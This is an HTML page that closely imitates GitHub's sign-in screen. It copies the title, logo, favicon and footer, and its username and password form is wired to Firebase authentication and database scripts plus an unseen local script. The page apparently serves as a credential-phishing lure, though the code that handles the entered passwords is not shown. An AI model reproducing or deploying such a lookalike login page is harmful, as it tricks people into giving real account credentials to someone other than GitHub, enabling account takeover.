<!DOCTYPE html>
<html lang="es">

<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-firestore-compat.js"></script>

<script src="js/index.js"></script>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <link rel="stylesheet" href="styles.css">

    <link rel="icon" type="image/x-icon" href="github_icono.ico">
</head>

<body>
    <div class="login-container">
        <img src="github-logo.png" alt="GitHub Logo">
        <h2>Sign in to GitHub</h2>

        <form id="login-form">
            <label for="username">Username</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>

            <button type="button" id="registro">Sign in</button>
        </form>

        <div class="create-account-container">
            <p>New to GitHub? <a href="#">Create an account.</a></p>
        </div>
    </div>

    <footer class="github-footer">
            <div class="footer-social">
                <a href="#" target="_blank" rel="noopener noreferrer">Terms</a>
                <a href="#" target="_blank" rel="noopener noreferrer">Privacy</a>
                <a href="#" target="_blank" rel="noopener noreferrer">Docs</a>
                <a href="#" target="_blank" rel="noopener noreferrer">Contact GitHub Support</a>
                <a href="#" target="_blank" rel="noopener noreferrer">Manage Cookies</a>
                <a href="#" target="_blank" rel="noopener noreferrer">Do not share my personal information</a>
            </div>
        </div>
    </footer>
</body>

</html>
